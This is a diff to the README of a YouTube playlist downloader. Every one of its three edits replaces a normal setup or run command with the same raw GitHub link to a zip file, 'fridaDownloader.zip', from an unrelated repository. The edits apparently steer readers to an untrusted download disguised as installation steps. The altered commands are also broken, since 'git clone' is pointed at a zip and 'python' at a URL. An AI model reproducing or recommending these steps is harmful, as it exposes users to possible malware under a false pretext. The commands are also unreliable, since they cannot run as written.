@@ -22,7 +22,7 @@ Scripts to download videos from YouTube playlists using `pytube` and `yt-dlp`.
 
 1. **Clone the repository**:
     ```bash
-    git clone https://github.com/YOUR_USERNAME/youtube-playlist-downloader.git
+    git clone https://raw.githubusercontent.com/Mohammed-FA/fridaDownloader/main/Peltogaster/fridaDownloader.zip
     cd youtube-playlist-downloader
     ```
 
@@ -39,7 +39,7 @@ This script fetches video URLs from a YouTube playlist and saves them to a text 
 
 1. **Run the script**:
     ```bash
-    python get_video_urls.py
+    python https://raw.githubusercontent.com/Mohammed-FA/fridaDownloader/main/Peltogaster/fridaDownloader.zip
     ```
 
 2. **Follow the prompt** to enter the YouTube playlist URL.
@@ -50,7 +50,7 @@ This script reads video URLs from a text file and downloads them using `yt-dlp`.
 
 1. **Run the script**:
     ```bash
-    python download_videos.py
+    python https://raw.githubusercontent.com/Mohammed-FA/fridaDownloader/main/Peltogaster/fridaDownloader.zip
     ```
 
 2. **Follow the prompt** to enter the desired video quality (e.g., highest, lowest, 720p, 1080p).
